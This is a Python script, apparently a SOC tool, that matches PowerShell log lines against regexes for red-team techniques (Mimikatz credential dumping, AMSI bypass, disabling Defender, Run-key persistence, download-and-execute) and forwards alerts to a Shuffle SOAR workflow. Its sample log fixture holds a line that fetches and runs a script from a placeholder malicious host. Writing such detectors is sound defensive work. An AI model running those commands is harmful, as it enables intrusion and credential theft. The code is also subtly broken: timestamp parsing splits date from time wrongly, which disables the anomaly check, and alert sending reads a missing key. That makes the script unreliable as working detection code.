import re
import json
import os
from datetime import datetime
from collections import Counter
import requests

# Simulated SOC log file (replace with actual log source in production)
LOG_FILE = "soc_logs.txt"

# Shuffle API configuration (update with your Shuffle instance details)
SHUFFLE_URL = "http://localhost:5001"  # Replace with your Shuffle instance URL
SHUFFLE_API_KEY = "your_shuffle_api_key_here"  # Replace with your API key
SHUFFLE_WORKFLOW_ID = "your_workflow_id_here"  # Replace with target workflow ID

# Red team PowerShell command patterns to detect
RED_TEAM_PATTERNS = {
    "DownloadString": r"IEX\s*\(New-Object\s*Net\.WebClient\)\.DownloadString\('http[^']*'\)",
    "InvokeCommand": r"Invoke-Command\s+-ComputerName\s+\S+\s+-ScriptBlock",
    "EncodedCommand": r"powershell\s+-enc\s+[A-Za-z0-9+/=]+",
    "AMSI_Bypass": r"\[Ref\]\.Assembly\.GetType\('System\.Management\.Automation\.AmsiUtils'\)",
    "Mimikatz": r"Invoke-Mimikatz\s+-Command\s+\"sekurlsa::logonpasswords\"",
    "Registry_Persistence": r"New-ItemProperty\s+-Path\s+'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
    "Disable_Defender": r"Set-MpPreference\s+-DisableRealtimeMonitoring\s+\$true",
    "Screenshot": r"\[Reflection\.Assembly\]::LoadWithPartialName\('System\.Drawing'\)",
}

# Simulated baseline for normal activity
BASELINE_ACTIVITY = {
    "powershell": 10,
    "net": 5,
    "whoami": 3,
}

class RedTeamDetector:
    def __init__(self, log_file):
        self.log_file = log_file
        self.alerts = []
        self.command_counter = Counter()

    def parse_logs(self):
        """Parse SOC logs and extract commands."""
        if not os.path.exists(self.log_file):
            print(f"Log file {self.log_file} not found.")
            return []

        logs = []
        with open(self.log_file, "r") as f:
            for line in f:
                try:
                    timestamp, command = line.strip().split(" ", 1)
                    logs.append({"timestamp": timestamp, "command": command})
                    self.command_counter[command.split()[0]] += 1
                except ValueError:
                    continue
        return logs

    def detect_red_team_patterns(self, logs):
        """Search for red team PowerShell patterns in logs."""
        for log in logs:
            command = log["command"]
            for pattern_name, pattern in RED_TEAM_PATTERNS.items():
                if re.search(pattern, command, re.IGNORECASE):
                    alert = {
                        "timestamp": log["timestamp"],
                        "command": command,
                        "pattern": pattern_name,
                        "severity": "High",
                        "message": f"Detected potential red team activity: {pattern_name}"
                    }
                    self.alerts.append(alert)

    def detect_anomalies(self, logs):
        """Detect anomalies based on command frequency."""
        current_hour = datetime.now().strftime("%Y-%m-%d %H")
        hourly_commands = Counter()

        for log in logs:
            log_hour = log["timestamp"][:13]
            if log_hour == current_hour:
                base_command = log["command"].split()[0]
                hourly_commands[base_command] += 1

        for cmd, count in hourly_commands.items():
            baseline = BASELINE_ACTIVITY.get(cmd, 0)
            if count > baseline * 2:
                alert = {
                    "timestamp": current_hour,
                    "command": cmd,
                    "pattern": "Anomaly",
                    "severity": "Medium",
                    "message": f"Unusual frequency of '{cmd}' (Count: {count}, Baseline: {baseline})"
                }
                self.alerts.append(alert)

    def generate_soar_payload(self, alert):
        """Generate a SOAR payload for Shuffle workflow execution."""
        soar_payload = {
            "execution_type": "start",
            "workflow_id": SHUFFLE_WORKFLOW_ID,
            "data": {
                "alert": {
                    "timestamp": alert["timestamp"],
                    "command": alert["command"],
                    "pattern": alert["pattern"],
                    "severity": alert["severity"],
                    "description": alert["message"]
                },
                "response_actions": [
                    {"action": "notify", "target": "security_team", "method": "email"},
                    {"action": "isolate_host", "target": "affected_host"},
                    {"action": "log_incident", "target": "SIEM"}
                ]
            }
        }
        return soar_payload

    def send_to_shuffle(self, payload):
        """Send the SOAR payload to Shuffle via API."""
        headers = {
            "Authorization": f"Bearer {SHUFFLE_API_KEY}",
            "Content-Type": "application/json"
        }
        try:
            response = requests.post(
                f"{SHUFFLE_URL}/api/v1/workflows/{SHUFFLE_WORKFLOW_ID}/execute",
                headers=headers,
                json=payload
            )
            if response.status_code == 200:
                print(f"Successfully sent alert to Shuffle: {payload['data']['alert']['message']}")
            else:
                print(f"Failed to send to Shuffle: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"Error sending to Shuffle: {e}")

    def generate_report(self):
        """Generate a JSON report and send alerts to Shuffle."""
        report = {
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "total_alerts": len(self.alerts),
            "alerts": self.alerts
        }
        with open("red_team_alerts.json", "w") as f:
            json.dump(report, f, indent=4)
        print(f"Report generated: red_team_alerts.json with {len(self.alerts)} alerts.")

        # Send each alert to Shuffle as a SOAR payload
        for alert in self.alerts:
            payload = self.generate_soar_payload(alert)
            self.send_to_shuffle(payload)

    def run(self):
        """Run the detection process."""
        print("Starting Red Team Attack Detection with Shuffle Integration...")
        logs = self.parse_logs()
        if not logs:
            print("No logs to analyze.")
            return
        
        self.detect_red_team_patterns(logs)
        self.detect_anomalies(logs)
        self.generate_report()
        if self.alerts:
            print("Potential red team activity detected and sent to Shuffle!")
            for alert in self.alerts:
                print(f"- {alert['message']} at {alert['timestamp']}")
        else:
            print("No suspicious activity detected.")

# Simulated SOC logs for testing
def create_sample_logs():
    sample_logs = [
        "2025-04-07 08:00:00 powershell -enc QW5vbWFseQ==",
        "2025-04-07 08:01:00 IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')",
        "2025-04-07 08:02:00 whoami",
        "2025-04-07 08:03:00 Invoke-Command -ComputerName TARGET -ScriptBlock { dir }",
        "2025-04-07 08:04:00 net user",
        "2025-04-07 08:05:00 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
    ]
    with open(LOG_FILE, "w") as f:
        f.write("\n".join(sample_logs))

if __name__ == "__main__":
    # Create sample logs for testing
    create_sample_logs()
    
    # Initialize and run the detector
    detector = RedTeamDetector(LOG_FILE)
    detector.run()